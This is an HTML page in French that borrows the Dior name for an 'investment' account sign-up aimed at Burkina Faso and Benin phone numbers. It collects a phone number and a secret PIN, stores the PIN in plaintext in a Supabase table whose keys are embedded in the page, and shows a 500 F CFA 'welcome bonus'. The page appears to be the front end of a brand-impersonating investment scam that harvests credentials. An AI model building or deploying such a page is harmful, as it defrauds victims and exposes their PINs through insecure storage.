<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIOR FASHION - Investissement</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <style>
        :root { --gold: #d4af37; --dark: #000; --grey: #1a1a1a; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--dark); color: white; text-align: center; }
        #auth-page { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .logo-dior { font-size: 50px; font-weight: bold; letter-spacing: 10px; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; border-bottom: 1px solid #444; width: 100%; max-width: 350px; }
        .input-group select, .input-group input { width: 100%; background: none; border: none; color: white; padding: 12px; outline: none; font-size: 16px; }
        .btn-gold { width: 100%; max-width: 350px; padding: 15px; border: 1px solid var(--gold); background: none; color: var(--gold); font-size: 16px; cursor: pointer; margin-top: 20px; }
        #main-app { display: none; padding: 20px; }
        .stat-card { background: var(--grey); padding: 20px; border: 1px solid var(--gold); border-radius: 10px; margin: 20px auto; max-width: 300px; }
    </style>
</head>
<body>

    <div id="auth-page">
        <div class="logo-dior">DIOR</div>
        <div class="input-group">
            <select id="pays">
                <option value="+226">Burkina Faso (+226)</option>
                <option value="+229">Bénin (+229)</option>
            </select>
        </div>
        <div class="input-group"><input type="number" id="numero" placeholder="Numéro de téléphone"></div>
        <div class="input-group"><input type="password" id="pin" placeholder="Code secret"></div>
        <button class="btn-gold" onclick="creerCompte()">CRÉER MON COMPTE</button>
    </div>

    <div id="main-app">
        <div class="logo-dior" style="font-size: 24px;">DIOR</div>
        <div class="stat-card">
            <small>SOLDE TOTAL</small><br>
            <b style="font-size: 25px; color: var(--gold);"><span id="solde-val">0</span> F CFA</b>
        </div>
        <p>Bienvenue ! Votre bonus de bienvenue de 500 F est actif.</p>
    </div>

    <script>
        // Configuration de tes clés Supabase réelles
        const supabaseUrl = "https://ciamfmmmznshnmmtxntf.supabase.co";
        const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNpYW1mbW1tem5zaG5tbXR4bnRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2NDYwNjgsImV4cCI6MjA5MTIyMjA2OH0.er_YZ2Mg-fwwXLPkS20eli1hO8eCfd8DReOferSBw3M";
        
        const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

        async function creerCompte() {
            const pays = document.getElementById('pays').value;
            const num = document.getElementById('numero').value;
            const codeSecret = document.getElementById('pin').value;
            const numeroComplet = pays + num;

            if(!num || !codeSecret) {
                alert("Veuillez remplir tous les champs !");
                return;
            }

            // Insertion dans la table utilisateurs avec bonus
            const { data, error } = await _supabase
                .from('utilisateurs')
                .insert([{ 
                    numero: numeroComplet, 
                    pin: codeSecret, 
                    solde: 500 
                }]);

            if (error) {
                alert("Erreur lors de la création : " + error.message);
            } else {
                alert("Compte créé avec succès ! Bonus de 500 F offert.");
                afficherApp(500);
            }
        }

        function afficherApp(montant) {
            document.getElementById('solde-val').innerText = montant;
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('main-app').style.display = 'block';
        }
    </script>
</body>
</html>
